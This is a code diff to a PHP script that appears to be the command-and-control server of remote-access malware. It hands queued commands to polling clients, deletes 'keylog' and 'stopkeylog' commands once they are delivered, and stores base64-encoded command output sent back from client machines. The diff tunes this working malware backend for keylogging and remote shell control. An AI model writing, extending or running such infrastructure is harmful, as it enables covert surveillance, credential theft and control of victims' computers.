@@ -1,5 +1,10 @@
 <?php
 header('Access-Control-Allow-Origin: *');
+header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
+header("Cache-Control: no-store, no-cache, must-revalidate"); // HTTP/1.1
+header("Cache-Control: post-check=0, pre-check=0", false);
+header("Pragma: no-cache"); // HTTP/1.0
+header("Expires: Sat, 26 Jul 1997 05:00:00 GMT"); // Date in the past
 
 //Iniciallize classes and stuff
 include 'sys/head.php';
@@ -11,7 +16,7 @@ if(key($_GET) === 'recv') {
   //Check if there is an active command
   if($cmd = $db->table('cnc')->find('active', 'true', 1)->get()) {
     $cmd = $cmd[array_key_first($cmd)];
-
+    $id = $cmd[array_key_first($cmd)];
     //Check if the command is still valid within the scope of its cool-down time
     $timer = time() - $cmd['timeIssued'];
     if( $timer > 31 ) {
@@ -49,6 +54,11 @@ if(key($_GET) === 'recv') {
 				$i++;
       }
       echo json_encode($return);
+
+      //list of commands we can delete imidiately after being reached to clear up wait time
+      if($cmd['command'] === 'keylog' || $cmd['command'] === 'stopkeylog') {
+        $db->table('cnc')->id($id)->delete();
+      }
     }
 		//Cleanup
 		else {
@@ -121,15 +131,15 @@ elseif(key($_GET) === 'post') {
 		}
 		echo json_encode(array('status' => $status));
 	} elseif($_GET['post'] == 'console' && isset($_POST['cmd'])) {
-		$output = (empty($_POST['log']))?'::No output recieved':base64_decode($_POST['log']);
+		$output = (empty($_POST['log']))?'undefined':base64_decode($_POST['log']);
 		$command = $_POST['cmd'];
 		if($row = $db->table('console')->find('uuid', $uuid, 1)->get()) {
-			$db->table('console')->find('uuid', $uuid)->change('log', $row[array_key_first($row)]['log']."\n$ {$command}\n{$output}\n");
+			$db->table('console')->find('uuid', $uuid)->change('log', $output);
 			$status = 'console_update';
 		} else {
 			$db->table('console')->put(array(
 			  'uuid'        => $uuid,
-			  'log'         => "[CONSOLE START]\n\$ {$command}\n{$output}\n"
+			  'log'         => $output
 			));
 			$status = 'console_new';
 		}
